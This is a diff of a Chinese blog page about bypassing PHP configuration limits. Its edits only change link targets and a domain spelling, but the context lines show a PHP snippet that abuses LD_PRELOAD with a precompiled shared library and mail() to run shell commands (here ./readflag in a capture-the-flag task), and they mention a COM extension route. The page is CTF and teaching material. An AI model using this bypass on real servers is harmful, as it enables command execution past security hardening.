@@ -500,7 +500,7 @@
 <p>这里面的仓库里有编译生成好的共享库文件，可以直接使用，通过设置<code>EVIL_CMDLINE</code>来执行系统命令</p>
 <p>php利用代码：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">putenv(&#39;EVIL_CMDLINE&#x3D;&#39;.&#39;cd &#x2F;%26%26.&#x2F;readflag &gt; &#x2F;tmp&#x2F;moonback1 2&gt;%261&#39;);			&#x2F;&#x2F;EVIL_CMDLINE&#x3D;shell命令，并将结果输出到一个文件</span><br><span class="line">putenv(&#39;LD_PRELOAD&#x3D;&#39;.&#39;&#x2F;tmp&#x2F;bypass_disablefunc_x64.so&#39;);	&#x2F;&#x2F;LD_PRELOAD&#x3D;动态加载库的位置</span><br><span class="line">mail(&#39;&#39;, &#39;&#39;, &#39;&#39;, &#39;&#39;);		&#x2F;&#x2F;用mail函数触发</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<p>这上面有道题（RCE me）我用的就是用的这种方法<a target="_blank" rel="noopener" href="http://www.moonback.xyz/2019/11/06/syc-ctf-wp/">http://www.moonback.xyz/2019/11/06/syc-ctf-wp/</a></p>
+<p>这上面有道题（RCE me）我用的就是用的这种方法<a href="http://www.moonback.xyz/2019/11/06/syc-ctf-wp/">http://www.moonback.xyz/2019/11/06/syc-ctf-wp/</a></p>
 <h3 id="COM组件"><a href="#COM组件" class="headerlink" title="COM组件"></a>COM组件</h3><p>需要php配置里开启com.allow_dcom，在php/ext/里面查找是否存在php_com_dotnet.dll这个文件</p>
 <pre><code>extension=php_com_dotnet.dll
 
@@ -568,7 +568,7 @@ chown -R nobody:nogroup /smb/</code></pre>
       <blockquote>
         
           
-            <p>本文永久链接是：<a href=http://www.m00nback.xyz/2019/11/29/bypass-php-ini/>http://www.m00nback.xyz/2019/11/29/bypass-php-ini/</a></p>
+            <p>本文永久链接是：<a href=http://www.moonback.xyz/2019/11/29/bypass-php-ini/>http://www.moonback.xyz/2019/11/29/bypass-php-ini/</a></p>
           
         
       </blockquote>
@@ -623,7 +623,7 @@ chown -R nobody:nogroup /smb/</code></pre>
       
         <a class="-mob-share-qq" title="" rel="external nofollow noopener noreferrer noopener"
           
-          target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.m00nback.xyz/2019/11/29/bypass-php-ini/&title=绕过php部分配置 - 明月归的小站&summary=本篇博客介绍了绕过一些php配置的方法！"
+          target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.moonback.xyz/2019/11/29/bypass-php-ini/&title=绕过php部分配置 - 明月归的小站&summary=本篇博客介绍了绕过一些php配置的方法！"
           
           >
           
@@ -635,7 +635,7 @@ chown -R nobody:nogroup /smb/</code></pre>
       
         <a class="-mob-share-qzone" title="" rel="external nofollow noopener noreferrer noopener"
           
-          target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://www.m00nback.xyz/2019/11/29/bypass-php-ini/&title=绕过php部分配置 - 明月归的小站&summary=本篇博客介绍了绕过一些php配置的方法！"
+          target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://www.moonback.xyz/2019/11/29/bypass-php-ini/&title=绕过php部分配置 - 明月归的小站&summary=本篇博客介绍了绕过一些php配置的方法！"
           
           >
           
@@ -647,7 +647,7 @@ chown -R nobody:nogroup /smb/</code></pre>
       
         <a class="-mob-share-weibo" title="" rel="external nofollow noopener noreferrer noopener"
           
-          target="_blank" href="http://service.weibo.com/share/share.php?url=http://www.m00nback.xyz/2019/11/29/bypass-php-ini/&title=绕过php部分配置 - 明月归的小站&summary=本篇博客介绍了绕过一些php配置的方法！"
+          target="_blank" href="http://service.weibo.com/share/share.php?url=http://www.moonback.xyz/2019/11/29/bypass-php-ini/&title=绕过php部分配置 - 明月归的小站&summary=本篇博客介绍了绕过一些php配置的方法！"
           
           >
           
